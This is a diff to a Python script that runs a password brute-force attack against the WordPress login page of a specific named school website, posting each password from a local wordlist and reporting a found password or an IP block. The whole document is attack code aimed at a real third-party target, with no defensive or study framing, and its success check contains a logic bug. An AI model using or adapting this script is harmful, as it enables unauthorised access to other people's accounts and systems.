@@ -30,7 +30,7 @@ def Brute():
     print()
     print("[*] Started Brute Force Attack On Target")
     print("[+] Attacking")
-    passwords = [x.strip() for x in open('Wordlist.txt', 'r').readlines() if x]
+    passwords = [x.strip() for x in open('C:\\Users\\hp\\passwords.txt', 'r').readlines() if x]
     
     for password in passwords:
         data = {
@@ -45,13 +45,13 @@ def Brute():
 
         response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)
         
-    if "The password you entered for the username" not in response.text:
+    if "The password you entered for the username" and "Unauthorized Access" not in response.text:
         print()
         print("[+] Password Found: " + password)
         pwd = "1"
         sys.exit()
-    if "firewall on this server" in response.text:
-        print("[-] Your IP Is Blocked By The Website")
+    elif "Unauthorized Access" in response.text:
+        print("[-] Your IP Has Been Blocked By The Firewall")
         sys.exit()
 
 try:
